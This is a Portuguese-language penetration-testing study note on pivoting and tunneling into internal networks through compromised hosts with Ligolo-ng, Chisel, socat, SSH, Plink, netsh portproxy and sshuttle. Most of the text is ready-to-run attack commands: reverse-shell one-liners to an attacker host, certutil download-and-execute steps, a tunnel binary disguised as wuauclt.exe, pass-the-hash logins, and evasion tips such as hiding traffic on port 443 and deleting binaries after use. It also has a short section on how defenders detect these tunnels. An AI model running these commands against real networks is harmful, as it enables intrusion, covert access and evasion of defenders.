---
title: "Pivoting & Tunneling"
---

# Pivoting e Tunelamento

## Trampolim: Do Primeiro Host ao DC Interno

Pivoting é a técnica de usar um host comprometido como trampolim para acessar redes não alcançáveis diretamente. Em ambientes corporativos reais, rede de produção, redes OT e sistemas críticos ficam em segmentos isolados — inacessíveis da internet. Para chegar lá, é preciso primeiro comprometer um host na DMZ ou em uma rede intermediária, e usar esse host para pivotar para dentro.

Sem pivoting, o engajamento termina no primeiro host comprometido. Com pivoting bem configurado, o atacante pode alcançar o controlador de domínio interno, bancos de dados, sistemas SCADA e outros alvos de alto valor — tudo roteado pelo host comprometido. Do ponto de vista do blue team, pivoting é difícil de detectar porque o tráfego malicioso aparece como tráfego legítimo vindo de hosts internos confiáveis.

---

## Port Forward, SOCKS Proxy e Tunnel VPN-like

### Modelo Mental de Pivoting

```
[Kali/Atacante]   →   [Host Comprometido A]   →   [Rede Interna 10.10.10.0/24]
192.168.1.100         192.168.1.50                   10.10.10.5 (DC)
                       10.10.10.50                    10.10.10.10 (DB)
```

O atacante não pode alcançar 10.10.10.0/24 diretamente. O Host A tem duas interfaces (ou tem rota para) ambas as redes. Ao estabelecer um túnel através do Host A, o atacante redireciona tráfego: Kali → Host A → rede interna.

### Tipos de Pivoting

1. **Port Forwarding**: Redirecionar uma porta específica (Kali:8080 → Interno:80)
2. **SOCKS Proxy**: Criar um proxy dinâmico que roteia qualquer conexão TCP através do pivot
3. **VPN-like Tunnel**: Interface de rede virtual que roteia uma sub-rede inteira (Ligolo-ng)
4. **Multi-hop**: A → B → C, pivotando por múltiplos segmentos

---

## Na Prática

### Ferramenta 1: Ligolo-ng (Solução Moderna Preferida)

Ligolo-ng cria uma interface TUN no Kali e roteia tráfego diretamente, sem precisar de proxychains. Funciona como uma VPN: o Kali "enxerga" a rede interna como se estivesse diretamente conectado a ela.

**Arquitetura:**
- `proxy` roda no Kali (lado do atacante)
- `agent` roda no host comprometido
- O agent conecta de volta ao proxy (reverso — útil quando o host comprometido está atrás de NAT/firewall)

#### Setup Completo no Kali

```bash
# Criar interface TUN (fazer uma vez, persiste até reboot)
sudo ip tuntap add dev ligolo mode tun
sudo ip link set ligolo up

# Verificar que a interface foi criada
ip link show ligolo

# Baixar proxy e agent
# https://github.com/nicocha30/ligolo-ng/releases
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64 -O proxy
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64 -O agent_linux
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_windows_amd64.exe -O agent_windows.exe
chmod +x proxy agent_linux

# Iniciar o proxy no Kali
# -selfcert: gera certificado TLS autoassinado (sem precisar de CA)
# -laddr: porta de escuta para conexões dos agents
./proxy -selfcert -laddr 0.0.0.0:11601
```

#### Agent no Host Comprometido (Linux)

```bash
# Transferir o agent para o host comprometido
# Via SCP se tiver credenciais SSH:
scp agent_linux user@PIVOT_HOST:/tmp/agent

# Via web server no Kali:
# python3 -m http.server 8000 (no Kali)
# wget http://KALI_IP:8000/agent_linux -O /tmp/agent (no host comprometido)

# Executar o agent (conecta ao proxy no Kali)
chmod +x /tmp/agent
/tmp/agent -connect KALI_IP:11601 -ignore-cert

# Para rodar em background:
nohup /tmp/agent -connect KALI_IP:11601 -ignore-cert &
```

#### Agent no Host Comprometido (Windows)

```cmd
rem Via PowerShell
Invoke-WebRequest -Uri "http://KALI_IP:8000/agent_windows.exe" -OutFile "C:\Windows\Temp\agent.exe"

rem Executar
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

rem Via certutil para download (LOLBIN)
certutil.exe -urlcache -split -f http://KALI_IP:8000/agent_windows.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert
```

#### Configurar o Túnel no Shell Interativo do Proxy

```
# No terminal do proxy (onde o ./proxy está rodando):
# Quando o agent conectar, verá:
# INFO[0010] Agent joined. name=HOSTNAME remote="10.10.10.50:54321"

# Listar sessões disponíveis
ligolo-ng » session
# 0: HOSTNAME (10.10.10.50) - linux/amd64

# Selecionar sessão
ligolo-ng » session 0
# ou
ligolo-ng » session
# e digitar o número

# Iniciar o túnel (começa a roteamento)
[Agent: HOSTNAME] » start
# INFO[0015] Starting tunnel

# Sair do shell interativo (o túnel continua ativo)
# Ctrl+C no shell interativo não mata o túnel
```

#### Adicionar Rotas para a Rede Interna

```bash
# De volta ao Kali, adicionar rota para a rede interna via interface ligolo
# Substituir 10.10.10.0/24 pela rede interna que o host comprometido pode alcançar

sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo     # Se houver segunda rede
sudo ip route add 192.168.100.0/24 dev ligolo  # Outra rede interna

# Verificar rotas
ip route show | grep ligolo

# Agora acessar hosts internos diretamente do Kali:
ping 10.10.10.5
nmap -sV 10.10.10.5
curl http://10.10.10.10:8080/
```

#### Listener para Receber Reverse Shells da Rede Interna

Quando o Host B (na rede interna) mandar uma reverse shell, ela chegará ao agente Ligolo, que redirecionará para o Kali.

```
# No shell do proxy Ligolo — criar listener
[Agent: HOSTNAME] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Explicação:
# --addr 0.0.0.0:4444   → o agent escuta na porta 4444 NO HOST COMPROMETIDO
# --to 127.0.0.1:4444   → redireciona para localhost:4444 NO KALI

# No Kali — iniciar listener para receber a shell
nc -lvnp 4444

# No host interno que você comprometeu (ex: 10.10.10.10):
bash -i >& /dev/tcp/PIVOT_HOST_IP/4444 0>&1
# A shell vai chegar no nc do Kali!
```

#### Multi-Hop com Ligolo-ng

Para pivotar de A → B → C (três segmentos):

```bash
# PASSO 1: Já tem agente no Host A (pivot 1)
# PASSO 2: Host A pode alcançar Host B (pivot 2) em 172.16.0.0/24
# PASSO 3: Host B pode alcançar Host C em 10.100.0.0/24

# Adicionar rota para rede do Host B via ligolo
sudo ip route add 172.16.0.0/24 dev ligolo

# Transferir agent para Host B ATRAVÉS do túnel Ligolo já estabelecido
# (Como o Kali agora "vê" 172.16.0.0/24 via ligolo)
scp agent_linux user@172.16.0.5:/tmp/agent
# ou HTTP server no Kali, wget do Host B

# No Host B — conectar ao proxy Ligolo no Kali
/tmp/agent -connect KALI_IP:11601 -ignore-cert
# NOTA: O tráfego do agent do Host B passa pelo túnel Ligolo do Host A

# No proxy Ligolo — nova sessão aparece
ligolo-ng » session
# 0: HostA (10.10.10.50)
# 1: HostB (172.16.0.5)

# Selecionar sessão do Host B e iniciar
ligolo-ng » session 1
[Agent: HostB] » start

# Adicionar rota para rede do Host C via ligolo (agora via Host B)
sudo ip route add 10.100.0.0/24 dev ligolo

# Agora o Kali pode alcançar Host C diretamente!
nmap -sV 10.100.0.10
```

---

### Ferramenta 2: Chisel

Chisel é um túnel TCP/UDP sobre HTTP, implementado em Go. Funciona bem quando apenas HTTP/HTTPS está liberado no firewall.

**Arquitetura:**
- `server` (no Kali) escuta conexões
- `client` (no host comprometido) conecta ao server e cria tunnels

#### Setup SOCKS Reverso (mais comum)

```bash
# KALI — iniciar servidor Chisel
./chisel server -p 8080 --reverse

# HOST COMPROMETIDO — criar SOCKS5 reverso
./chisel client KALI_IP:8080 R:socks
# R: = reverse (o client pede ao server para abrir a porta)
# socks = criar SOCKS5 proxy
# Resultado: SOCKS5 em 127.0.0.1:1080 NO KALI

# Verificar que a porta foi aberta no Kali
ss -tlnp | grep 1080
```

#### Usar com Proxychains

```bash
# Editar /etc/proxychains.conf (ou proxychains4.conf)
sudo nano /etc/proxychains4.conf

# Ao final do arquivo, adicionar/substituir linha de proxy:
# [ProxyList]
socks5  127.0.0.1  1080

# Usar qualquer ferramenta via proxychains
proxychains nmap -sT -Pn 10.10.10.5
proxychains curl http://10.10.10.10/
proxychains ssh user@10.10.10.5
proxychains evil-winrm -i 10.10.10.5 -u Administrator -p 'Password123'

# Importante: proxychains não funciona com nmap -sS (SYN scan)
# Usar -sT (TCP connect) e -Pn (skip host discovery)
```

#### Port Forward Local (acesso a serviço específico)

```bash
# Acessar INTERNAL_HOST:80 como se fosse localhost:8888 no Kali
./chisel client KALI_IP:8080 8888:INTERNAL_HOST:80

# Outro exemplo: acesso ao RDP de um host interno
./chisel client KALI_IP:8080 13389:10.10.10.5:3389
# Agora: rdesktop localhost:13389 no Kali conecta ao RDP de 10.10.10.5
```

#### Port Forward Reverso (expor serviço do Kali para o host comprometido)

```bash
# Kali escuta na porta 9999
# O host comprometido (e qualquer coisa que ele alcança) pode acessar o Kali via essa porta
./chisel client KALI_IP:8080 R:9999:127.0.0.1:9999

# Caso de uso: receber shell reversa de host interno
# No Kali: nc -lvnp 9999
# No host interno: bash -i >& /dev/tcp/PIVOT_HOST_IP/9999 0>&1
```

#### Transferência do Binário Chisel

```bash
# Kali: servir o binário
python3 -m http.server 8000

# Host comprometido Linux:
wget http://KALI_IP:8000/chisel_linux_amd64 -O /tmp/chisel
chmod +x /tmp/chisel

# Host comprometido Windows:
certutil -urlcache -split -f http://KALI_IP:8000/chisel_windows_amd64.exe C:\Windows\Temp\chisel.exe
```

---

### Ferramenta 3: SOCAT

SOCAT é um relay TCP/UDP flexível disponível na maioria das distros Linux. Não cria SOCKS — faz forwarding de portas específicas.

```bash
# Relay TCP simples — porta 8080 local → TARGET:80
socat TCP4-LISTEN:8080,fork TCP4:TARGET_IP:80

# Com SSL (bypass de DPI que busca texto claro)
# Gerar certificado
openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 365 -out cert.pem
cat cert.key cert.pem > combined.pem

socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0,fork TCP4:TARGET_IP:80

# Relay UDP
socat UDP4-LISTEN:53,fork UDP4:DNS_SERVER:53

# Shell reversa via socat (mais estável que nc)
# Kali listener:
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# Host comprometido:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:KALI_IP:4444

# Port forwarding encadeado (A → B via C)
# No host B (intermediário):
socat TCP4-LISTEN:8081,fork TCP4:10.10.10.10:80
# No Kali:
socat TCP4-LISTEN:8082,fork TCP4:HOST_B_IP:8081
# Agora localhost:8082 → Host B:8081 → 10.10.10.10:80
```

---

### Ferramenta 4: SSH Tunnels

SSH tunnels são a solução mais disponível — se houver SSH no host comprometido, não é preciso transferir nenhuma ferramenta adicional.

```bash
# LOCAL PORT FORWARD (-L)
# Acessa INTERNAL_HOST:80 como localhost:8080 no Kali
# Requer: Kali faz SSH para JUMPHOST
ssh -L 8080:INTERNAL_HOST:80 user@JUMPHOST_IP -N
# -N: não executar comando remoto (só o túnel)
# -f: ir para background
# -C: compressão

# Exemplo prático: acessar web app interna
ssh -L 8888:10.10.10.10:80 ubuntu@JUMPHOST -N -f
curl http://localhost:8888/admin/

# REMOTE/REVERSE FORWARD (-R)
# Expõe localhost:22 do Kali na porta 9999 do servidor remoto
# Útil: o servidor remoto (host comprometido) pode voltar a conectar ao Kali
ssh -R 9999:localhost:22 user@JUMPHOST_IP -N
# Alguém no JUMPHOST pode: ssh -p 9999 localhost → chega no Kali

# DYNAMIC SOCKS PROXY (-D)
# Cria SOCKS5 proxy no localhost:1080 roteando tudo via JUMPHOST
ssh -D 1080 user@JUMPHOST_IP -N
# Agora: proxychains [qualquer_ferramenta] → vai via JUMPHOST

# COMBINAÇÃO MAIS ÚTIL
# SOCKS proxy dinâmico com keep-alive e compressão
ssh -D 1080 -C -N -o ServerAliveInterval=60 user@JUMPHOST_IP

# Multi-hop SSH
# Kali → Host A → Host B
ssh -J user@HOSTA user@HOSTB
# Ou via config em ~/.ssh/config:
# Host hostb
#   ProxyJump user@hosta
#   User user
#   HostName HOSTB_IP
```

#### SSH Config para Facilitar Pivoting

```bash
# ~/.ssh/config
Host pivot1
    HostName PIVOT1_IP
    User ubuntu
    IdentityFile ~/.ssh/pivot_key
    ServerAliveInterval 60

Host internal-host
    HostName 10.10.10.5
    User administrator
    ProxyJump pivot1
    # Conectar diretamente: ssh internal-host
```

---

### Ferramenta 5: PLINK (Windows sem cliente SSH)

Plink é o equivalente de linha de comando do PuTTY. Disponível em Windows que não têm cliente SSH nativo (sistemas legados).

```cmd
rem Download (ou já disponível se PuTTY instalado)
rem https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

rem REMOTE FORWARD: expor porta local do host comprometido via Kali
plink.exe -ssh -l sshuser -pw "PASSWORD" -R 127.0.0.1:4455:127.0.0.1:445 KALI_IP

rem Explicação:
rem R 127.0.0.1:4455:127.0.0.1:445
rem → no Kali, porta 4455 → host comprometido porta 445 (SMB)
rem Agora: de qualquer lugar, conectar à porta 4455 do Kali → cai no SMB do host Windows

rem DYNAMIC SOCKS proxy
plink.exe -ssh -l sshuser -pw "PASSWORD" -D 1080 KALI_IP
rem SOCKS5 em localhost:1080 do host Windows, roteando via Kali

rem Aceitar automaticamente host key (insecure, mas necessário em scripts)
plink.exe -ssh -l user -pw PASS -batch -R 4455:127.0.0.1:445 KALI_IP

rem Usando chave privada em vez de senha
plink.exe -ssh -i C:\path\key.ppk -l user KALI_IP -N -R 4455:127.0.0.1:445
```

---

### Ferramenta 6: Netsh Portproxy (Windows Nativo, Requer Admin)

Netsh portproxy usa o driver WinHTTP integrado ao Windows para criar port forwards persistentes. Requer administrador mas não precisa de binários externos.

```cmd
rem CRIAR port forward
rem listenaddress: endereço em que o host comprometido vai escutar
rem listenport: porta em que vai escutar
rem connectaddress: destino do forward
rem connectport: porta de destino

netsh interface portproxy add v4tov4 ^
    listenaddress=0.0.0.0 ^
    listenport=8080 ^
    connectaddress=10.10.10.5 ^
    connectport=80

rem VERIFICAR configuração atual
netsh interface portproxy show all
rem saída:
rem Listen on ipv4:             Connect to ipv4:
rem Address         Port        Address         Port
rem --------------- ----------  --------------- ----------
rem 0.0.0.0         8080        10.10.10.10     80

rem DELETAR regra específica
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080

rem LIMPAR todas as regras
netsh interface portproxy reset

rem REGRA DE FIREWALL para permitir conexões entrantes na porta configurada
netsh advfirewall firewall add rule ^
    name="WindowsPortForward" ^
    dir=in ^
    action=allow ^
    protocol=TCP ^
    localport=8080

rem DELETAR regra de firewall (limpeza)
netsh advfirewall firewall delete rule name="WindowsPortForward"

rem Caso de uso: comprometeu Windows na DMZ
rem hosts externos podem acessar HOST_DMZ:8080 → chega em INTERNAL:80
rem combinado com Chisel do Kali: Kali → Chisel → HOST_DMZ:8080 → 10.10.10.5:80
```

---

### Ferramenta 7: sshuttle — VPN Transparente via SSH

**sshuttle** cria uma VPN-like transparente — tráfego para subnets configuradas vai automaticamente via SSH sem precisar de `proxychains`. Requer Python3 no SSH server e root no Kali.

```bash
# Rotear subnets internas via host comprometido
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

# Múltiplas subnets separadas por espaço
sshuttle -r user@PIVOT_IP 10.0.0.0/8 172.16.0.0/12 192.168.1.0/24

# Com porta SSH customizada
sshuttle -r user@PIVOT_IP:2222 10.10.10.0/24

# Excluir uma subnet do roteamento (ex: não rotear o próprio pivot)
sshuttle -r user@PIVOT_IP 10.0.0.0/8 -x 10.1.1.1/32
```

**Resultado:** conexões diretas sem prefixo de proxychains:
```bash
# Com sshuttle ativo, não precisa de proxychains:
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
nmap -sT --top-ports=20 172.16.50.217   # nmap direto (sem proxychains)
ssh user@10.4.50.100                     # ssh direto para rede interna
```

**Vantagens vs proxychains:** não usa `LD_PRELOAD` — funciona com binários estáticos e qualquer ferramenta sem suporte a SOCKS.

---

### SSH Remote Dynamic Port Forward — SOCKS Proxy Reverso

**Útil quando firewall bloqueia inbound** mas host comprometido pode fazer outbound SSH para Kali.

```bash
# Do HOST COMPROMETIDO, executar (outbound SSH para Kali):
ssh -N -R 9998 kali@192.168.118.4
# Resultado: SOCKS5 proxy abre no LOOPBACK do Kali na porta 9998
# Requer OpenSSH >= 7.6 no cliente (servidor não importa)

# Verificar no Kali:
ss -ntplu | grep 9998   # deve aparecer 127.0.0.1:9998 LISTEN
```

**Configurar proxychains4.conf no Kali:**
```
socks5 127.0.0.1 9998
```

```bash
# Usar qualquer ferramenta via proxychains
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

**Proxychains — Tuning para Scans Rápidos:**
```
# /etc/proxychains4.conf
tcp_read_time_out 800    # reduzir de 15000 (default) — acelera nmap via SOCKS
tcp_connect_time_out 800 # idem
```

### ssh.exe Nativo (Windows 10 1803+) — Remote Dynamic

Windows 10 versão 1803+ tem OpenSSH embutido com versão ≥ 7.6 → suporta Remote Dynamic.

```powershell
# Verificar versão
where ssh
ssh -V   # deve ser >= 7.6

# Remote dynamic port forward — mesmo sintax do Linux
ssh.exe -N -R 9998 kali@KALI_IP
# Abre SOCKS proxy na porta 9998 do loopback da Kali
```

**Plink Limitação:** Plink **NÃO** suporta remote dynamic port forwarding. Usar `ssh.exe` nativo ou Chisel como alternativa.

**Aceitar host key automaticamente em Plink (non-TTY shell):**
```cmd
:: Para não travar em "Store key in cache? (y/n)"
cmd.exe /c echo y | plink.exe -ssh -l kali -pw PASS -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
```

---

## Tabela Comparativa

| Ferramenta   | OS         | Admin? | SOCKS? | TCP Forward | Multi-hop  | Detecção       | Caso de Uso Ideal                          |
|--------------|------------|--------|--------|-------------|------------|----------------|--------------------------------------------|
| Ligolo-ng    | L/W        | Sim*   | Sim    | Sim         | Sim        | Baixa          | Pivot completo, substitui proxychains      |
| Chisel       | L/W        | Nao    | Sim    | Sim         | Com stack  | Baixa-Média    | HTTP/HTTPS only, sem SSH disponível        |
| SOCAT        | Linux      | Nao    | Nao    | Sim         | Manual     | Baixa          | Relay rápido, pivots simples               |
| SSH -L/-D    | L/W**      | Nao    | Sim    | Sim         | -J flag    | Baixa          | Quando SSH disponível, solução mais limpa  |
| Plink        | Windows    | Nao    | Sim    | Sim         | Com stack  | Baixa          | Windows legado sem SSH nativo              |
| Netsh proxy  | Windows    | Sim    | Nao    | Sim         | Manual     | Média          | Windows sem binários externos, persistente |

*Ligolo-ng requer `sudo ip tuntap` no Kali (requer root no Kali, não necessariamente no pivot)
**SSH nativo disponível no Windows 10 1809+

---

## Cenários Práticos Completos

### Cenário 1: Linux Comprometido → Pivot para Rede Interna com Ligolo-ng

**Ambiente:**
- Kali: 192.168.1.100
- Host comprometido (pivot): 192.168.1.50 / 10.10.10.50
- Rede interna: 10.10.10.0/24 (DC em 10.10.10.5, DB em 10.10.10.10)

```bash
# === KALI ===
# 1. Setup da interface
sudo ip tuntap add dev ligolo mode tun && sudo ip link set ligolo up

# 2. Iniciar proxy
./proxy -selfcert -laddr 0.0.0.0:11601 &

# 3. Servir o agent
python3 -m http.server 8000 &

# === HOST COMPROMETIDO (via shell reversa ou SSH) ===
# 4. Baixar e executar agent
wget http://192.168.1.100:8000/agent_linux -O /tmp/agent
chmod +x /tmp/agent
nohup /tmp/agent -connect 192.168.1.100:11601 -ignore-cert > /dev/null 2>&1 &

# === KALI (no proxy shell interativo) ===
# 5. Selecionar sessão e iniciar túnel
session 0
start

# === KALI (nova aba/terminal) ===
# 6. Adicionar rota
sudo ip route add 10.10.10.0/24 dev ligolo

# 7. Testar acesso
ping 10.10.10.5
nmap -sT -Pn -p 445,389,88,3389 10.10.10.5

# 8. Receber shells da rede interna
# No proxy shell Ligolo:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# No Kali: nc -lvnp 4444
# No host interno 10.10.10.10: bash -i >& /dev/tcp/10.10.10.50/4444 0>&1
```

### Cenário 2: Windows Comprometido → Pivot com Netsh + Chisel

**Ambiente:**
- Kali: 10.0.0.100
- Windows comprometido (DMZ): 10.0.0.50 / 172.16.0.50
- Rede interna: 172.16.0.0/24

```cmd
rem === WINDOWS COMPROMETIDO (como admin) ===

rem 1. Criar port forward para Chisel server no Kali
netsh interface portproxy add v4tov4 ^
    listenaddress=0.0.0.0 listenport=9999 ^
    connectaddress=10.0.0.100 connectport=8080

rem 2. Liberar no firewall
netsh advfirewall firewall add rule name="CorporateProxy" ^
    dir=in action=allow protocol=TCP localport=9999

rem 3. Baixar Chisel
certutil -urlcache -split -f http://10.0.0.100:8000/chisel_windows.exe C:\Windows\Temp\wuauclt.exe

rem 4. Conectar ao Chisel server no Kali via reverse SOCKS
C:\Windows\Temp\wuauclt.exe client 10.0.0.100:8080 R:socks
```

```bash
# === KALI ===
# 1. Iniciar Chisel server
./chisel server -p 8080 --reverse &

# 2. Após conexão do Windows, SOCKS5 disponível em 127.0.0.1:1080
ss -tlnp | grep 1080

# 3. Usar proxychains para acessar rede interna
proxychains nmap -sT -Pn 172.16.0.5
proxychains crackmapexec smb 172.16.0.0/24
proxychains evil-winrm -i 172.16.0.5 -u Administrator -H "HASH"
```

### Cenário 3: Multi-hop A → B → C com Ligolo-ng

**Ambiente:**
- Kali: 10.0.0.100
- Host A (pivot 1): 10.0.0.50 / 192.168.10.50
- Host B (pivot 2): 192.168.10.60 / 172.16.5.60
- Host C (alvo final): 172.16.5.10

```bash
# === FASE 1: Pivot A ===
# Setup Ligolo no Kali, agent no Host A
# (igual Cenário 1)
sudo ip route add 192.168.10.0/24 dev ligolo

# === FASE 2: Preparar agent para Host B ATRAVÉS do túnel ===
# O Kali agora alcança 192.168.10.x via ligolo
# Servir agent via HTTP (acessível de 192.168.10.x)
python3 -m http.server 8000  # Kali escuta em :8000

# SSH para Host B via túnel Ligolo (sem precisar do Host A como jumphost)
ssh user@192.168.10.60
# Uma vez em Host B:
wget http://10.0.0.100:8000/agent_linux -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect 10.0.0.100:11601 -ignore-cert &
# O tráfego de 192.168.10.60 → 10.0.0.100 passa pelo ligolo transparentemente

# === FASE 3: No proxy Ligolo ===
# Nova sessão aparece para Host B
session
# 0: HostA (10.0.0.50)
# 1: HostB (192.168.10.60)

# Selecionar Host B e iniciar segundo túnel
session 1
start

# === FASE 4: Rota para rede de Host C ===
sudo ip route add 172.16.5.0/24 dev ligolo

# === ACESSO FINAL ===
nmap -sT -Pn 172.16.5.10
ssh user@172.16.5.10   # direto do Kali!
```

---

## Detecção e OPSEC

### Como Defensores Detectam Pivoting

**Ligolo-ng:**
- Conexão TLS de saída para porta não-padrão (11601) — monitorar conexões de saída incomuns
- Interface TUN no Kali é transparente para o alvo
- O agent no host comprometido mantém conexão persistente para fora

**Chisel:**
- Tráfego HTTP/HTTPS com padrões de tunelamento (headers incomuns, WebSocket upgrade)
- Porta 8080 ou outras não-padrão com alto volume de dados
- Binário desconhecido executando conexão persistente de saída

**SSH Tunnels:**
- Conexões SSH saindo do host comprometido (incomum em servidores de aplicação)
- EventID 4624 (logon tipo 3) para conexões SSH
- NetFlow mostrando SSH para IPs externos

**Netsh portproxy:**
- `netsh interface portproxy show all` revela tudo
- Regras de firewall suspeitas adicionadas
- EventID 4657 se auditoria de registro habilitada

### Práticas de OPSEC

```bash
# Usar portas comuns para camuflar tráfego
# Em vez de porta 11601, usar 443 (Ligolo suporta)
./proxy -selfcert -laddr 0.0.0.0:443

# Chisel via porta 443 com TLS
./chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse

# SSH via porta 443 (se permitido no firewall)
ssh -p 443 user@KALI_IP -D 1080 -N

# Limitar taxa de transferência para evitar alertas de anomalia
# (Chisel e SSH suportam throttling via configuração)

# Usar certificados válidos em vez de autoassinados
# (Chisel e Ligolo aceitam certificados Let's Encrypt)

# Remover binários do disco após estabelecer o túnel
# Usar execução em memória quando possível
```

---

## Módulos Relacionados

`04_network_filters_bypass.md` é o complemento direto — cobre o que fazer quando egress filtering bloqueia as ferramentas desta nota (Chisel, Ligolo-ng na porta padrão). `02_lateral_movement_linux_ssh.md` fornece a base de SSH tunneling que pivoting avançado expande. ATT&CK T1572 (Protocol Tunneling), T1090 (Proxy) e T1090.003 (Multi-hop Proxy) mapeiam as técnicas desta nota.
- **Módulo relacionado**: `01_lateral_movement.md` — após estabelecer o pivot, usar para movimentação lateral
- **Módulo relacionado**: `../06_pos_exploracao_windows/05_persistencia.md` — persistência no pivot para manter o túnel ativo
